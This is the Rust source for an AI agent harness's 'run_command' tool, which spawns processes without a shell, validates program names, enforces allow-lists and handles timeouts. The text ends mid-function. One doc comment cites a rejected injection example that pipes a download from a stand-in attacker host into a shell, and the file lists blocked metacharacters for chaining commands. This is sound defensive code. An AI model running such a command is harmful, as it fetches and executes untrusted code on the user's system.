use crate::error::ToolError;
use crate::sandbox::Sandbox;
use crate::tool::{Tool, ToolContext};
use async_trait::async_trait;
use aura_core::ToolResult;
use aura_core::{Capability, ToolDefinition};
use std::path::Path;
use tracing::{debug, instrument};

/// Result of a threshold-based wait operation.
///
/// When a command is run with a sync threshold:
/// - `Completed`: The command finished within the threshold
/// - `Pending`: The command is still running, handle returned for async tracking
pub enum ThresholdResult {
    /// Command completed within the threshold.
    Completed(std::process::Output),
    /// Command is still running after the threshold.
    Pending(std::process::Child),
}

/// Reject any program name that could be interpreted as a shell command.
///
/// Used to keep [`cmd_spawn`] safe: even though the default path no
/// longer wraps invocations in `sh -c` / `cmd.exe /C`, a hostile caller
/// could still embed metacharacters in `program` and hope the OS falls
/// back to shell resolution (`CreateProcessW` on Windows, `posix_spawn`
/// on Unix). Rejecting these characters up front guarantees that what
/// the caller typed is a bare executable name or path.
///
/// Rejects:
/// - Empty strings
/// - Control characters (`< 0x20` or `0x7F`)
/// - ASCII whitespace (space, tab)
/// - Shell metacharacters: `;`, `&`, `|`, `>`, `<`, `$`, backtick, `\`,
///   `(`, `)`, `{`, `}`, `[`, `]`, `*`, `?`, `#`, `'`, `"`, `\n`, `\r`
///
/// On violation returns [`ToolError::InvalidArguments`] describing the
/// offending character.
fn validate_program_name(program: &str) -> Result<(), ToolError> {
    if program.is_empty() {
        return Err(ToolError::InvalidArguments(
            "program must not be empty".into(),
        ));
    }
    for c in program.chars() {
        let code = c as u32;
        let is_ctrl = code < 0x20 || code == 0x7F;
        let is_ws = c == ' ' || c == '\t';
        let is_meta = matches!(
            c,
            ';' | '&'
                | '|'
                | '>'
                | '<'
                | '$'
                | '`'
                | '\\'
                | '('
                | ')'
                | '{'
                | '}'
                | '['
                | ']'
                | '*'
                | '?'
                | '#'
                | '\''
                | '"'
                | '\n'
                | '\r'
        );
        if is_ctrl || is_ws || is_meta {
            return Err(ToolError::InvalidArguments(format!(
                "program '{program}' contains disallowed character {c:?}; \
                 use the 'shell_script' field for shell-quoted scripts"
            )));
        }
    }
    Ok(())
}

/// Spawn a command directly, WITHOUT routing through a shell interpreter.
///
/// `program` is validated via [`validate_program_name`] so that shell
/// metacharacters cannot sneak in. `args` is passed verbatim to
/// `Command::args` — individual arguments may contain arbitrary bytes
/// (including spaces, pipes, semicolons) because they are never
/// re-parsed by a shell.
///
/// Callers that genuinely need a shell (multi-command pipelines, glob
/// expansion, etc.) must use [`cmd_spawn_shell_script`] and funnel
/// through `ToolConfig::command.allowed_shell_scripts`.
///
/// Returns the [`Child`](std::process::Child) and a display-only string
/// suitable for audit logs. The string is not executable by itself.
#[instrument(skip(sandbox), fields(program = %program))]
pub fn cmd_spawn(
    sandbox: &Sandbox,
    program: &str,
    args: &[String],
    cwd: Option<&str>,
) -> Result<(std::process::Child, String), ToolError> {
    use std::process::{Command, Stdio};

    validate_program_name(program)?;

    let working_dir = match cwd {
        Some(dir) => sandbox.resolve_existing(dir)?,
        None => sandbox.root().to_path_buf(),
    };

    debug!(
        ?working_dir,
        arg_count = args.len(),
        "Spawning command (no shell)"
    );

    let display = if args.is_empty() {
        program.to_string()
    } else {
        format!("{} {}", program, args.join(" "))
    };

    // On Windows, Rust's `Command::new("npm")` calls `CreateProcessW`
    // after a PATH search that does NOT honour `PATHEXT`, so shims that
    // ship as `.cmd` / `.bat` (npm, yarn, pnpm, ng, vite, eslint,
    // prettier, …) all fail with `program not found`. Resolve the bare
    // name through `which` first so we feed `Command` an absolute path
    // and the child process is launched directly without `cmd.exe`
    // re-parsing argv (preserves the no-shell guarantee that protects
    // arguments containing spaces, semicolons, etc.).
    #[cfg(windows)]
    let fresh_path = refresh_system_path();

    let spawn_target: std::ffi::OsString = {
        #[cfg(windows)]
        {
            windows_resolve_program(program, fresh_path.as_deref(), &working_dir)
                .map(std::path::PathBuf::into_os_string)
                .unwrap_or_else(|| program.into())
        }
        #[cfg(not(windows))]
        {
            program.into()
        }
    };

    let mut cmd = Command::new(&spawn_target);
    cmd.args(args);

    #[cfg(windows)]
    {
        if let Some(ref fresh_path) = fresh_path {
            cmd.env("PATH", fresh_path);
        }
        cmd.env("PYTHONUTF8", "1");
        cmd.env("PYTHONIOENCODING", "utf-8");
    }

    // Strip ANSI color and progress-bar output from spawned tools.
    // Cargo, ripgrep, ls, etc. all inherit these, keeping captured
    // stdout/stderr free of escape sequences and carriage returns so
    // it renders cleanly when the harness forwards it to the LLM and
    // then on into the main chat.
    apply_plain_output_env(&mut cmd);

    cmd.current_dir(&working_dir)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let child = cmd.spawn().map_err(|e| {
        ToolError::CommandFailed(format!("Failed to spawn command '{program}': {e}"))
    })?;

    Ok((child, display))
}

/// Disable colored / progress output for spawned child processes.
///
/// Applied uniformly to every command the harness launches so we never
/// have to worry about ANSI escape sequences or `\r`-driven progress
/// bars leaking into captured stdout/stderr.
fn apply_plain_output_env(cmd: &mut std::process::Command) {
    cmd.env("CARGO_TERM_COLOR", "never");
    cmd.env("CARGO_TERM_PROGRESS_WHEN", "never");
    cmd.env("NO_COLOR", "1");
    cmd.env("CLICOLOR", "0");
    cmd.env("CLICOLOR_FORCE", "0");
    cmd.env("TERM", "dumb");
}

/// Spawn a raw shell script under `sh -c` / `cmd.exe /C`.
///
/// This is the ONLY code path that exposes a shell interpreter to
/// caller-controlled strings. It is gated by the tool layer behind an
/// explicit `ToolConfig::command.allowed_shell_scripts`
/// allow-list; do not call it from other places without applying the
/// same gate.
#[instrument(skip(sandbox), fields(shell_script = %shell_script))]
fn cmd_spawn_shell_script(
    sandbox: &Sandbox,
    shell_script: &str,
    cwd: Option<&str>,
) -> Result<(std::process::Child, String), ToolError> {
    use std::process::{Command, Stdio};

    let working_dir = match cwd {
        Some(dir) => sandbox.resolve_existing(dir)?,
        None => sandbox.root().to_path_buf(),
    };

    debug!(?working_dir, "Spawning shell script (opt-in)");

    #[cfg(windows)]
    let mut cmd = {
        use std::os::windows::process::CommandExt;
        let mut c = Command::new("cmd.exe");
        c.raw_arg(format!("/C {shell_script}"));
        c
    };

    #[cfg(not(windows))]
    let mut cmd = {
        let mut c = Command::new("sh");
        c.args(["-c", shell_script]);
        c
    };

    #[cfg(windows)]
    {
        if let Some(fresh_path) = refresh_system_path() {
            cmd.env("PATH", fresh_path);
        }
        cmd.env("PYTHONUTF8", "1");
        cmd.env("PYTHONIOENCODING", "utf-8");
    }

    apply_plain_output_env(&mut cmd);

    cmd.current_dir(&working_dir)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let child = cmd
        .spawn()
        .map_err(|e| ToolError::CommandFailed(format!("Failed to spawn shell script: {e}")))?;

    Ok((child, shell_script.to_string()))
}

/// Run a command with threshold-based execution.
///
/// This waits for the command to complete up to `sync_threshold_ms`.
/// - If the command completes within the threshold, returns `ThresholdResult::Completed`
/// - If the command is still running after the threshold, returns `ThresholdResult::Pending`
///   with the child handle for async tracking
///
/// The command is spawned directly (no shell wrapping); see [`cmd_spawn`].
#[instrument(skip(sandbox), fields(program = %program))]
pub fn cmd_run_with_threshold(
    sandbox: &Sandbox,
    program: &str,
    args: &[String],
    cwd: Option<&str>,
    sync_threshold_ms: u64,
) -> Result<(ThresholdResult, String), ToolError> {
    use std::time::Duration;

    let (child, full_command) = cmd_spawn(sandbox, program, args, cwd)?;

    let result = wait_with_threshold(child, Duration::from_millis(sync_threshold_ms));
    Ok((result, full_command))
}

/// Run a command synchronously with a timeout.
///
/// Spawns directly (no shell). Use `cmd_run_with_threshold` for
/// async-capable execution.
#[instrument(skip(sandbox), fields(program = %program))]
pub fn cmd_run(
    sandbox: &Sandbox,
    program: &str,
    args: &[String],
    cwd: Option<&str>,
    timeout_ms: u64,
) -> Result<ToolResult, ToolError> {
    use std::time::Duration;

    let (child, _full_command) = cmd_spawn(sandbox, program, args, cwd)?;

    let output = match wait_with_hard_timeout(child, Duration::from_millis(timeout_ms)) {
        Ok(out) => out,
        Err(e) => {
            return Err(ToolError::CommandFailed(format!("Command timed out: {e}")));
        }
    };

    output_to_tool_result_with_program(output, Some(program), args)
}

/// Run a raw shell script synchronously with a timeout.
///
/// See [`cmd_spawn_shell_script`] — the caller is responsible for
/// enforcing `ToolConfig::command.allowed_shell_scripts`
/// before invoking this.
fn cmd_run_shell_script(
    sandbox: &Sandbox,
    shell_script: &str,
    cwd: Option<&str>,
    timeout_ms: u64,
) -> Result<ToolResult, ToolError> {
    use std::time::Duration;

    let (child, _display) = cmd_spawn_shell_script(sandbox, shell_script, cwd)?;

    let output = match wait_with_hard_timeout(child, Duration::from_millis(timeout_ms)) {
        Ok(out) => out,
        Err(e) => {
            return Err(ToolError::CommandFailed(format!("Command timed out: {e}")));
        }
    };

    output_to_tool_result(output)
}

/// Truncation limits for command output.
const STDOUT_TRUNCATE_LIMIT: usize = 8_000;
/// Truncation limit for stderr.
const STDERR_TRUNCATE_LIMIT: usize = 4_000;

/// Truncate a string to at most `limit` bytes on a char boundary.
fn truncate_output(s: &str, limit: usize) -> String {
    if s.len() <= limit {
        return s.to_string();
    }
    let mut end = limit;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}\n... (truncated, {limit} char limit)", &s[..end])
}

/// Convert process output to a tool result.
///
/// Returns a *successful* `ToolResult` in all cases (never `Err`) so that
/// downstream command-failure tracking can rely on `ToolResult::ok == false`
/// (`is_error`) rather than on a Rust `Err` variant.
///
/// Stdout is capped at 8 000 chars, stderr at 4 000 chars.
#[allow(clippy::needless_pass_by_value)]
pub fn output_to_tool_result(output: std::process::Output) -> Result<ToolResult, ToolError> {
    output_to_tool_result_with_program(output, None, &[])
}

/// Variant that also receives the spawned program / args so it can run
/// language-specific output classifiers (today: `cargo check|build|
/// test|clippy` stderr → structured error metadata so the agent loop
/// sees "compiler errors detected" even when stdout was empty).
///
/// Returns `Result` for symmetry with [`output_to_tool_result`] and so
/// the call site in `cmd_run` can use the `?` operator alongside the
/// other fallible spawn / wait helpers without introducing an awkward
/// `Ok(...)` wrap.
#[allow(clippy::needless_pass_by_value, clippy::unnecessary_wraps)]
pub(crate) fn output_to_tool_result_with_program(
    output: std::process::Output,
    program: Option<&str>,
    cmd_args: &[String],
) -> Result<ToolResult, ToolError> {
    let raw_stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let raw_stderr = String::from_utf8_lossy(&output.stderr).to_string();

    let stdout = truncate_output(&raw_stdout, STDOUT_TRUNCATE_LIMIT);
    let stderr = truncate_output(&raw_stderr, STDERR_TRUNCATE_LIMIT);

    let exit_code = output.status.code().unwrap_or(-1);
    let cargo_diagnostics = classify_cargo_invocation(program, cmd_args)
        .map(|_subcommand| extract_cargo_errors(&raw_stderr))
        .unwrap_or_default();

    if output.status.success() {
        let mut result = ToolResult::success("run_command", stdout);
        if !stderr.is_empty() {
            result.stderr = stderr.into_bytes().into();
        }
        result = result.with_metadata("exit_code", "0".to_string());
        result = attach_cargo_error_metadata(result, &cargo_diagnostics);
        Ok(result)
    } else {
        let structured = format!("exit_code: {exit_code}\nstdout:\n{stdout}\nstderr:\n{stderr}");
        let mut result = ToolResult::failure("run_command", structured);
        result.exit_code = Some(exit_code);
        result = result.with_metadata("exit_code", exit_code.to_string());
        result = attach_cargo_error_metadata(result, &cargo_diagnostics);
        Ok(result)
    }
}

/// Structured pull-out of one `error[Eddd]: …` block from `cargo`
/// stderr. Populated by [`extract_cargo_errors`] from the
/// `--message-format=short` / human stderr format. We intentionally
/// keep the parser line-oriented and cheap — the goal is just to
/// surface the FIRST few diagnostics to the agent loop, not to replace
/// `cargo`'s JSON output.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct CargoError {
    pub code: String,
    pub message: String,
    pub location: Option<String>,
}

/// Heuristic: return `Some(subcommand)` when the spawned program looks
/// like a Rust build verb whose stderr is worth parsing. `cargo check`,
/// `cargo build`, `cargo test`, `cargo clippy` and `cargo run` all
/// emit the same `error[Exxxx]:` format.
fn classify_cargo_invocation(program: Option<&str>, args: &[String]) -> Option<&'static str> {
    let program_name = program?.rsplit(['/', '\\']).next()?;
    let stem = program_name
        .strip_suffix(".exe")
        .or_else(|| program_name.strip_suffix(".EXE"))
        .unwrap_or(program_name);
    if !stem.eq_ignore_ascii_case("cargo") {
        return None;
    }
    let subcommand = args.iter().find(|a| !a.starts_with('+'))?;
    match subcommand.as_str() {
        "check" => Some("check"),
        "build" => Some("build"),
        "test" => Some("test"),
        "clippy" => Some("clippy"),
        "run" => Some("run"),
        _ => None,
    }
}

/// Scan `cargo` stderr for `error[Exxxx]: <message>` blocks and the
/// `--> file:line:col` line that follows them. Returns at most
/// [`MAX_CAPTURED_ERRORS`] entries to keep the metadata blob small;
/// the agent only needs the first few to know it has work to do.
fn extract_cargo_errors(stderr: &str) -> Vec<CargoError> {
    const MAX_CAPTURED_ERRORS: usize = 5;
    let mut out: Vec<CargoError> = Vec::new();
    let lines: Vec<&str> = stderr.lines().collect();
    let mut idx = 0;
    while idx < lines.len() && out.len() < MAX_CAPTURED_ERRORS {
        let line = lines[idx].trim_start();
        if let Some(remainder) = line.strip_prefix("error[") {
            if let Some(close) = remainder.find(']') {
                let code = remainder[..close].to_string();
                let after_code = remainder[close + 1..].trim_start();
                let message = after_code
                    .strip_prefix(':')
                    .map_or_else(|| after_code.to_string(), |s| s.trim().to_string());
                // Look ahead at the next non-blank line for the `-->`
                // file location cargo prints under each diagnostic.
                let mut location = None;
                for follow in lines.iter().skip(idx + 1).take(3) {
                    let f = follow.trim_start();
                    if let Some(loc) = f.strip_prefix("--> ") {
                        location = Some(loc.trim().to_string());
                        break;
                    }
                }
                out.push(CargoError {
                    code,
                    message,
                    location,
                });
            }
        }
        idx += 1;
    }
    out
}

/// Attach a compact `cargo_errors` metadata blob plus a human-readable
/// `compiler_errors` count when [`extract_cargo_errors`] surfaced any
/// diagnostics. `cargo_errors` is JSON so downstream consumers can
/// machine-parse it without re-running the regex.
fn attach_cargo_error_metadata(mut result: ToolResult, errors: &[CargoError]) -> ToolResult {
    if errors.is_empty() {
        return result;
    }
    let json: Vec<serde_json::Value> = errors
        .iter()
        .map(|err| {
            serde_json::json!({
                "code": err.code,
                "message": err.message,
                "location": err.location,
            })
        })
        .collect();
    if let Ok(serialised) = serde_json::to_string(&json) {
        result = result.with_metadata("cargo_errors", serialised);
    }
    result = result.with_metadata("compiler_errors", errors.len().to_string());
    result
}

/// Wait for a child process with a threshold.
///
/// If the process completes within the threshold, returns `ThresholdResult::Completed`.
/// If the process is still running after the threshold, returns `ThresholdResult::Pending`
/// with the child handle intact (NOT killed).
fn wait_with_threshold(
    mut child: std::process::Child,
    threshold: std::time::Duration,
) -> ThresholdResult {
    use std::io::Read;
    use std::thread;
    use std::time::Instant;

    let start = Instant::now();
    loop {
        if let Ok(Some(status)) = child.try_wait() {
            let stdout = child.stdout.take().map_or_else(Vec::new, |mut s| {
                let mut buf = Vec::new();
                let _ = s.read_to_end(&mut buf);
                buf
            });
            let stderr = child.stderr.take().map_or_else(Vec::new, |mut s| {
                let mut buf = Vec::new();
                let _ = s.read_to_end(&mut buf);
                buf
            });
            return ThresholdResult::Completed(std::process::Output {
                status,
                stdout,
                stderr,
            });
        } else if start.elapsed() > threshold {
            return ThresholdResult::Pending(child);
        }
        thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// Wait for a child process with a hard timeout (kills on timeout).
///
/// This is the original timeout behavior - if the process doesn't complete
/// within the timeout, it is killed and an error is returned.
fn wait_with_hard_timeout(
    mut child: std::process::Child,
    timeout: std::time::Duration,
) -> std::io::Result<std::process::Output> {
    use std::io::Read;
    use std::thread;
    use std::time::Instant;

    let start = Instant::now();
    loop {
        if let Some(status) = child.try_wait()? {
            let stdout = child.stdout.take().map_or_else(Vec::new, |mut s| {
                let mut buf = Vec::new();
                let _ = s.read_to_end(&mut buf);
                buf
            });
            let stderr = child.stderr.take().map_or_else(Vec::new, |mut s| {
                let mut buf = Vec::new();
                let _ = s.read_to_end(&mut buf);
                buf
            });
            return Ok(std::process::Output {
                status,
                stdout,
                stderr,
            });
        }

        if start.elapsed() > timeout {
            let _ = child.kill();
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "Process timed out",
            ));
        }
        thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// PATHEXT-aware program resolution for [`cmd_spawn`] on Windows.
///
/// Rust's standard library performs a bare-name PATH search that ignores
/// `PATHEXT`, so `Command::new("npm")` cannot find `npm.cmd`. This helper
/// uses [`which::which_in`] (which *does* honour `PATHEXT`) against the
/// freshly-merged registry+process PATH to produce an absolute path
/// pointing at the correct shim, while leaving caller-supplied paths
/// (anything with a separator) and explicit-extension names (`foo.exe`,
/// `bar.cmd`) untouched so we don't second-guess the operator's intent.
///
/// Returns `None` when:
/// - the input already contains a path separator (so it's a relative or
///   absolute path the OS can resolve directly);
/// - the input already ends with a recognised executable extension;
/// - `which` cannot find any matching binary on PATH (the caller then
///   falls back to `Command::new(program)` and lets the OS produce its
///   native `program not found` error).
#[cfg(windows)]
fn windows_resolve_program(
    program: &str,
    fresh_path: Option<&str>,
    cwd: &std::path::Path,
) -> Option<std::path::PathBuf> {
    let path = std::path::Path::new(program);
    if path.components().count() > 1 {
        return None;
    }
    let lower = program.to_ascii_lowercase();
    if lower.ends_with(".exe")
        || lower.ends_with(".cmd")
        || lower.ends_with(".bat")
        || lower.ends_with(".com")
        || lower.ends_with(".ps1")
    {
        return None;
    }
    match fresh_path {
        Some(p) => which::which_in(program, Some(p), cwd).ok(),
        None => which::which(program).ok(),
    }
}

/// Read the current Machine + User PATH from the Windows registry and merge it
/// with the process PATH so that both registry entries (which may have been
/// updated since the harness started) and session-only entries (e.g. Python
/// user-scripts installed via pip) are available to child processes.
#[cfg(windows)]
fn refresh_system_path() -> Option<String> {
    fn read_reg_path(key: &str) -> Option<String> {
        std::process::Command::new("reg")
            .args(["query", key, "/v", "Path"])
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .and_then(|s| {
                s.lines()
                    .find(|l| l.contains("REG_"))
                    .and_then(|l| {
                        l.split("REG_EXPAND_SZ")
                            .nth(1)
                            .or_else(|| l.split("REG_SZ").nth(1))
                    })
                    .map(|v| v.trim().to_string())
            })
            .map(|p| expand_env_vars(&p))
    }

    let machine_reg =
        read_reg_path(r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment");
    let user_reg = read_reg_path(r"HKCU\Environment");

    let process_path = std::env::var("PATH").unwrap_or_default();

    let mut segments: Vec<&str> = Vec::new();

    if let Some(ref m) = machine_reg {
        segments.extend(m.split(';').filter(|s| !s.is_empty()));
    }
    if let Some(ref u) = user_reg {
        segments.extend(u.split(';').filter(|s| !s.is_empty()));
    }
    for entry in process_path.split(';').filter(|s| !s.is_empty()) {
        if !segments
            .iter()
            .any(|existing| existing.eq_ignore_ascii_case(entry))
        {
            segments.push(entry);
        }
    }

    if segments.is_empty() {
        return None;
    }

    Some(segments.join(";"))
}

/// Expand `%VAR%` patterns in a string using the current process environment.
/// Registry PATH values are stored as REG_EXPAND_SZ with variables like
/// `%SystemRoot%`, `%USERPROFILE%`, etc. that must be resolved before use.
#[cfg(windows)]
fn expand_env_vars(input: &str) -> String {
    let mut result = input.to_string();
    while let Some(start) = result.find('%') {
        if let Some(end) = result[start + 1..].find('%') {
            let var_name = &result[start + 1..start + 1 + end];
            let replacement = std::env::var(var_name).unwrap_or_default();
            result = format!(
                "{}{}{}",
                &result[..start],
                replacement,
                &result[start + 1 + end + 1..]
            );
        } else {
            break;
        }
    }
    result
}

/// Strip a Windows-style executable suffix (`.exe`, `.cmd`, `.bat`) from a
/// resolved binary file name, case-insensitively, so allow-list entries can
/// stay platform-agnostic.
///
/// `"git"` matches both `git` and `git.exe`; `"npm"` matches `npm.cmd`
/// (the shim `which` returns for Node-tooling on Windows); `"npx"` matches
/// `npx.cmd`; analogous for `pnpm`/`yarn`/`tsc`/etc. Without this, the
/// resolved Windows shim file name (`npm.cmd`) never matches a bare
/// allow-list entry (`npm`), and the harness rejects valid invocations
/// with `Forbidden(npm.cmd)`.
fn strip_windows_executable_suffix(name: &str) -> &str {
    const SUFFIXES: &[&str] = &[".exe", ".cmd", ".bat"];
    for suffix in SUFFIXES {
        if name.len() > suffix.len() {
            let (head, tail) = name.split_at(name.len() - suffix.len());
            if tail.eq_ignore_ascii_case(suffix) {
                return head;
            }
        }
    }
    name
}

/// Resolve `program` through `which` and check its file name against
/// `allowlist`.
///
/// Distinct from [`check_command_allowlist`], which matches the raw user
/// string: binary allow-listing defeats PATH-shadowing attacks because we
/// compare the **resolved executable file name** rather than whatever the
/// caller typed. Called *before* [`cmd_spawn`] in `run_command`.
///
/// This function now fails **closed**: when command execution is enabled
/// and `allowlist` is empty, the caller's config is considered
/// mis-configured and the call is rejected with
/// [`ToolError::Forbidden`]. Previously an empty list short-circuited to
/// "allowed", which left the command-execution tool effectively
/// unrestricted by default. (Phase 2 hardening.)
///
/// When command execution is disabled the allow-list check is skipped
/// because the dispatcher will have already refused the tool call at a
/// higher level.
fn check_binary_allowlist(
    program: &str,
    command_enabled: bool,
    bypass_allowlists: bool,
    allowlist: &[String],
) -> Result<(), ToolError> {
    if !command_enabled {
        return Ok(());
    }

    if bypass_allowlists {
        return Ok(());
    }

    if allowlist.is_empty() {
        return Err(ToolError::Forbidden(
            "command execution requires a non-empty binary_allowlist; \
             configure ToolConfig::command.binary_allowlist"
                .into(),
        ));
    }

    if Path::new(program).components().count() == 1
        && !allowlist
            .iter()
            .any(|allowed| allowed == &strip_windows_executable_suffix(program))
    {
        return Err(ToolError::Forbidden(format!(
            "program '{program}' is not present in ToolConfig::command.binary_allowlist"
        )));
    }

    // When the caller already passes an absolute/relative path, honor it;
    // otherwise resolve via PATH. `which` handles the Windows `.exe`
    // extension normalization for us.
    let resolved = if Path::new(program).components().count() > 1 {
        Path::new(program).to_path_buf()
    } else {
        which::which(program).map_err(|e| {
            ToolError::Forbidden(format!("could not resolve program '{program}': {e}"))
        })?
    };

    let file_name = resolved
        .file_name()
        .and_then(|s| s.to_str())
        .map(|s| strip_windows_executable_suffix(s).to_string())
        .ok_or_else(|| {
            ToolError::Forbidden(format!("program '{program}' resolved to a non-UTF-8 path"))
        })?;

    if allowlist.iter().any(|a| a == &file_name) {
        Ok(())
    } else {
        Err(ToolError::Forbidden(file_name))
    }
}

/// Validate a command string against the allowlist.
///
/// When the allowlist is non-empty, the command must match at least one entry.
/// Single-token entries match the first token of the command (program name).
/// Multi-token entries (containing whitespace) match as a prefix of the full
/// command, enabling rules like `"start obsidian://"` that restrict both the
/// program and its arguments. Shell metacharacters that could chain additional
/// commands are rejected.
fn check_command_allowlist(
    command: &str,
    bypass_allowlists: bool,
    allowlist: &[String],
) -> Result<(), ToolError> {
    if bypass_allowlists {
        return Ok(());
    }

    if allowlist.is_empty() {
        return Ok(());
    }

    let dangerous: &[&str] = if cfg!(windows) {
        &[";", "&&", "||", "|", "$(", "`", "\n", "&", ">", "<", "^"]
    } else {
        &[";", "&&", "||", "|", "$(", "`", "\n", ">", "<", "<("]
    };
    for meta in dangerous {
        if command.contains(meta) {
            return Err(ToolError::CommandNotAllowed(format!(
                "shell metacharacter '{meta}' not allowed"
            )));
        }
    }

    let program = command.split_whitespace().next().unwrap_or(command);
    let allowed = allowlist.iter().any(|a| {
        if a.contains(' ') {
            command.starts_with(a.as_str())
        } else {
            a == program
        }
    });
    if !allowed {
        return Err(ToolError::CommandNotAllowed(program.into()));
    }
    Ok(())
}

/// `run_command` tool: run an external program.
///
/// Phase 2 hardening: the default invocation form is `program` +
/// `args`, which is spawned DIRECTLY (no shell wrapping). `program` is
/// validated against shell metacharacters and whitespace so a hostile
/// tool proposal like `program = "ls; curl attacker.tld | sh"` is
/// rejected as [`ToolError::InvalidArguments`] before any process is
/// spawned.
///
/// Callers that genuinely need a shell must:
/// 1. Enable `ToolConfig::command.allow_shell`
///    (or pass `allow_shell: true` per-call).
/// 2. Invoke with `shell_script: "<the script>"`.
///
/// By default
/// `ToolConfig::command.allowed_shell_scripts`
/// is empty, which follows the same "empty allowlist = all allowed"
/// convention used by `command_allowlist`: once `allow_shell == true`
/// is granted, any shell script is executable. Operators who want to pin
/// a specific set of scripts populate the list with verbatim entries,
/// which switches the gate back to strict membership checking.
///
/// The `command` (single shell string) form is retained for backward
/// compatibility and is treated identically to `shell_script`.
pub struct CmdRunTool;

#[async_trait]
impl Tool for CmdRunTool {
    fn name(&self) -> &str {
        "run_command"
    }

    fn definition(&self) -> ToolDefinition {
        ToolDefinition {
            name: "run_command".into(),
            description: "Run an external program. Default: pass 'program' + 'args' (no shell). \
                 Shell scripts require allow_shell=true; the optional allowed_shell_scripts list \
                 pins a specific set when non-empty (empty = all scripts allowed). \
                 For directory listings prefer the dedicated `list_files` tool over shelling out; \
                 on Windows the binary allowlist intentionally omits `ls` (use `dir` or `list_files`)."
                .into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "program": {
                        "type": "string",
                        "description": "Executable name or path. Rejected if it contains whitespace, control chars, or shell metacharacters. Pair with 'args'."
                    },
                    "args": {
                        "type": "array",
                        "items": { "type": "string" },
                        "description": "Arguments passed verbatim to 'program' (no shell parsing)."
                    },
                    "shell_script": {
                        "type": "string",
                        "description": "Opt-in shell script (sh -c on Unix, cmd.exe /C on Windows). Requires allow_shell=true. When ToolConfig::command.allowed_shell_scripts is non-empty the script must appear verbatim; an empty list permits any script. Mutually exclusive with 'program'/'args'."
                    },
                    "allow_shell": {
                        "type": "boolean",
                        "description": "Per-call opt-in for the shell_script path."
                    },
                    "cwd": {
                        "type": "string",
                        "description": "Working directory (default: workspace root)"
                    },
                    "working_dir": {
                        "type": "string",
                        "description": "Working directory (alias for 'cwd')"
                    },
                    "timeout_ms": {
                        "type": "integer",
                        "description": "Timeout in milliseconds (default: 30000)"
                    },
                    "timeout_secs": {
                        "type": "integer",
                        "description": "Timeout in seconds (alternative to timeout_ms)"
                    }
                }
            }),
            cache_control: None,
            eager_input_streaming: None,
        }
    }

    fn required_capabilities(&self) -> Vec<Capability> {
        vec![Capability::InvokeProcess]
    }

    async fn execute(
        &self,
        ctx: &ToolContext,
        args: serde_json::Value,
    ) -> Result<ToolResult, ToolError> {
        let run_args = parse_run_args(&args, ctx);
        enforce_command_policy(&run_args, ctx)?;
        execute_run_command(run_args, ctx).await
    }
}

/// Parsed `run_command` arguments after pulling them out of the JSON
/// envelope. Pure data — every policy / allow-list decision lives in
/// [`enforce_command_policy`] so the parser never returns a partially
/// validated request.
///
/// Field semantics:
/// - `cwd`: alias-resolved (`cwd` / `working_dir`); `None` ⇒ workspace root.
/// - `timeout_ms`: `timeout_secs * 1000` if provided, else `timeout_ms`,
///   else `ctx.config.sync_threshold_ms`.
/// - `allow_shell`: per-call override or `ctx.config.command.allow_shell`.
/// - `shell_script`: alias-resolved (`shell_script` / legacy `command`).
/// - `program` + `cmd_args`: direct-spawn form. Mutually exclusive with
///   `shell_script` (enforced in policy).
struct RunArgs {
    cwd: Option<String>,
    timeout_ms: u64,
    allow_shell: bool,
    shell_script: Option<String>,
    program: Option<String>,
    cmd_args: Vec<String>,
}

/// Pull every `run_command` field out of the JSON envelope without
/// applying any policy. Defaults match the original inline behavior:
/// `cwd` / `working_dir` are aliased, `timeout_secs` overrides
/// `timeout_ms`, and the legacy `command` field is treated as a
/// `shell_script` alias.
fn parse_run_args(args: &serde_json::Value, ctx: &ToolContext) -> RunArgs {
    let cwd = args["cwd"]
        .as_str()
        .or_else(|| args["working_dir"].as_str())
        .map(String::from);

    let timeout_ms = if let Some(secs) = args["timeout_secs"].as_u64() {
        secs * 1000
    } else {
        args["timeout_ms"]
            .as_u64()
            .unwrap_or(ctx.config.sync_threshold_ms)
    };

    let allow_shell = args["allow_shell"]
        .as_bool()
        .unwrap_or(ctx.config.command.allow_shell);

    // The legacy `command` field is treated as a shell_script alias
    // so the same gate applies. Callers shouldn't rely on it; the
    // field remains only to avoid breaking older tool proposals.
    let shell_script = args["shell_script"]
        .as_str()
        .or_else(|| args["command"].as_str())
        .map(String::from);

    let program = args["program"].as_str().map(String::from);
    let cmd_args: Vec<String> = args["args"]
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    RunArgs {
        cwd,
        timeout_ms,
        allow_shell,
        shell_script,
        program,
        cmd_args,
    }
}

/// Apply every policy gate to a parsed [`RunArgs`].
///
/// Mirrors the original inline ordering exactly so error messages don't
/// shift between releases:
/// 1. `command.enabled = false` is the outermost gate (Phase 5 hardening
///    — refuses even when a caller reaches `CmdRunTool` directly,
///    bypassing `ToolExecutor`'s category-level gate).
/// 2. Shell-script branch: `allow_shell`, mutual-exclusion with
///    `program` / `args`, `allowed_shell_scripts`,
///    `command_allowlist`, then `binary_allowlist` against the first
///    token (so an operator who's narrowed those lists sees consistent
///    behavior with the direct-execution path).
/// 3. Direct branch: presence of `program`, `validate_program_name`
///    (rejects injection attempts before `which` masquerades them as
///    `Forbidden`), then `command_allowlist` and `binary_allowlist`.
fn enforce_command_policy(args: &RunArgs, ctx: &ToolContext) -> Result<(), ToolError> {
    if !ctx.config.command.enabled {
        return Err(ToolError::Forbidden(
            "command execution disabled; set ToolConfig::command.enabled=true \
             and populate binary_allowlist to opt in"
                .into(),
        ));
    }

    if let Some(script) = &args.shell_script {
        if !args.allow_shell {
            return Err(ToolError::InvalidArguments(
                "'shell_script' requires allow_shell=true (per-call or in ToolConfig)".into(),
            ));
        }
        if args.program.is_some() || !args.cmd_args.is_empty() {
            return Err(ToolError::InvalidArguments(
